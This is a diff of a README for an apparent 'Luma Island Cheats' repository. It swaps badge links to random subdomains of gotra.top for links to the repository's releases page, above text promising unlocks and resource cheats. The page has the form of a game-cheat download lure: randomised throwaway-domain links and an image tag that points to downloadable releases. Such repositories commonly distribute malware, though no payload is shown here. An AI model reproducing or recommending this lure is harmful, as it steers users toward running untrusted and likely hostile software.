@@ -1,9 +1,9 @@
-![hq720](https://github.com/user-attachments/assets/b4063c93-5d57-4369-9cb6-ca0be3aead90)
+![hq720](https://github.com/douglaskaue/Luma-Island-Cheats/releases)
 
 # **Luma Island Cheats**
 
 #
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+[![https://github.com/douglaskaue/Luma-Island-Cheats/releases](https://github.com/douglaskaue/Luma-Island-Cheats/releases)](https://github.com/douglaskaue/Luma-Island-Cheats/releases)
 
 Welcome to the **Luma Island Cheats** repository! This guide is your ultimate resource for exploring hidden features, unlocking new abilities, and improving your gameplay in **Luma Island**. Whether you're looking to gather resources more efficiently, unlock all items, or boost your progress, this repository has everything you need to dominate the island!
 
